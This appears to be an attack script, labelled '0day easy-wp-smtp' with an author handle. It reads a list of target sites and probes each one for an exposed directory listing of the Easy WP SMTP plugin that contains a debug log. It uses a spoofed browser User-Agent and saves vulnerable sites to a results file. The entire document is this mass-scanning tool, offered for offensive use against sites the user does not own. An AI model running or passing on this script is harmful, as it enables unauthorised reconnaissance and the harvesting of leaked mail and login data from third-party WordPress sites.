import requests
from threading import Thread
w = '\033[0;37;40m'
r = '\033[1;31;40m'
g = '\033[1;32;40m'

def Exploits():
        try:
                print(' \n 0day easy-wp-smtp')
                print(' Author : angga1337\n')
                url = input(' [O] Sitelist: ')
                urlOpen = open(url, 'r')
                exploitwp = '/wp-content/plugins/easy-wp-smtp/'
                for a in urlOpen.readlines():
                        b = a.replace('\n', '')
                        r = requests.get(b+exploitwp, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'})
                        if "Index of /" in r.text:
                                if 'debug' in r.text:
                                        print(' [+] {} --> {}Debug Log Found!{}'.format(b+exploitwp,g,w))
                                        saveres = open('result.txt', 'a')
                                        saveres.write(b+'/wp-content/plugins/easy-wp-smtp\n')
                                else:
                                        print(' [x] {} --> {} Debug Log Not Found!{}'.format(b,r,w))
                        else:
                                print(' [x] {} --> {} Debug Log Not Found!{}'.format(b,r,w))
        except:
                print(' [x] {} --> {}Website Error!{}'.format(b,r,w))

        print('\n')
        print(' [@] Result saved on result.txt')

T = Thread(target=Exploits)
T.start()
